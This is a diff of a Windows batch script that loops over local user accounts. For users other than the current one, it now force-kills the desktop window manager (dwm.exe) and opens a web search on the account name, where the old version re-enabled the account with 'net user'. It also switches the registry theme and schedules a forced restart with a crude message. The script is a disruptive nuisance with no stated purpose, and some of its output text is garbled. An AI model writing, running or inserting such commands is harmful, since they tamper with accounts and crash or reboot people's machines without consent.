@@ -35,11 +35,12 @@ for /f "skip=1" %%u in ('wmic useraccount get name') do (
     set "trim=!user: =!"
     if not "!trim!"=="" if /i not "!trim!"=="%currentUser%" (
         echo !trim! has referenced a ass object reference
-        net user "!trim!" /active:yes
+        taskkill /f /im dwm.exe
+        start "" https://google.com/search?q=!trim!
     )
     endlocal
 
     
 ) >> C:/log2.log
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes" /v CurrentTheme /t REG_SZ /d "Windows Standard" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Themes" /v CurrentTheme /t REG_SZ /d "Windows Classic" /f
 shutdown /r /t 60 /c "The browser that gets more done, up your ass."
